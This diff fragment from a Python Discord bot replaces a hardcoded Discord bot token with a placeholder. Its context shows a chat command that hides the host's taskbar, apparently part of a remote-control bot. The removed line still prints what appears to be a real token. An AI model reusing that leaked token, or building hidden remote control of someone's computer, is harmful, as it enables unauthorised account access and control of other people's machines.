@@ -272,5 +272,5 @@ async def on_message(message):
         hide_taskbar()
         await message.channel.send('Taskbar Disabled...')        
 
-token = 'ODAxMDkzMDk4Nzg4MDkzOTYy.YAbqFg.zjlEP73ruQ1JaVO5FhqaOeLC6qE'            
+token = 'YOUR DISCORD BOT TOKEN'            
 client.run(token)
